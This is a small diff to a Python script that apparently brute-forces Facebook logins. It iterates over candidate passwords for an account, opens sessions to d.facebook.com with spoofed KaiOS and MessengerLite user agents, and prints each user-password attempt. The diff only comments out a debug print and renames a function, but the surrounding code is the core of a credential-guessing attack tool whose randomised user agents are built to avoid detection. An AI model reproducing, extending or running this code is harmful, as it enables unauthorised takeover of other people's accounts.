@@ -18,7 +18,7 @@ def c(e,pw):
   status=0
   for p in pw:
      
-    print(f"for {e}-{p}")
+    #print(f"for {e}-{p}")
     s=r.Session()
     s.headers.update({'User-Agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'})
     fb=s.get("https://d.facebook.com")
@@ -124,7 +124,7 @@ def generate_ugent():
     ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; 21061119DG Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/3;FBMF/xiaomi;FBBD/xiaomi;FBDV/21061119DG;FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
     return ugent
 nn=0
-def n(user,pw):
+def napi(user,pw):
     global nn
     print(f"{nn} [{user} {pw}]",end="\r")
     ses=r.Session()
